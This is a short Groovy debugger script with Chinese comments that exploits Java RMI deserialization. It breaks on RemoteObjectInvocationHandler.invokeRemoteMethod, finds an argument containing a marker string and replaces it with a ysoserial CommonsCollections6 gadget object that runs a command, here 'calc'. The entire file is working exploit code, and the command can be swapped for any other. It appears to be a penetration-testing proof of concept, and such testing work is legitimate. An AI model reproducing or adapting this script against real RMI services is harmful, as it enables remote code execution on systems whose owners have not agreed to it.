// 使用的ysoserial中的payload名称
def payloadName = "CommonsCollections6";
//执行的命令
def payloadCommand = "calc";
//替换的参数值
def needle = "al1ex"
 
println "Loaded..."
 
// set a breakpoint at "invokeRemoteMethod", search the passed argument for a String object
// that contains needle. If found, replace the object with the generated payload
vm.methodEntryBreakpoint("java.rmi.server.RemoteObjectInvocationHandler", "invokeRemoteMethod") {
  // make sure that the payload class is loaded by the classloader of the debugee
  vm.loadClass("ysoserial.payloads." + payloadName);
  println "[+] java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod() is called"
 
  // get the Array of Objects that were passed as Arguments
  delegate."@2".eachWithIndex { arg,idx ->
	  println "[+] Argument " + idx + ": " + arg[0].toString();
    if(arg[0].toString().contains(needle)) {
      println "[+] Needle " + needle + " found, replacing String with payload" 
      def payload = vm._new("ysoserial.payloads." + payloadName);
      def payloadObject = payload.getObject(payloadCommand)
	   
      vm.ref("java.lang.reflect.Array").set(delegate."@2",idx, payloadObject);
	    println "[+] Done.."	
	  }
  }
}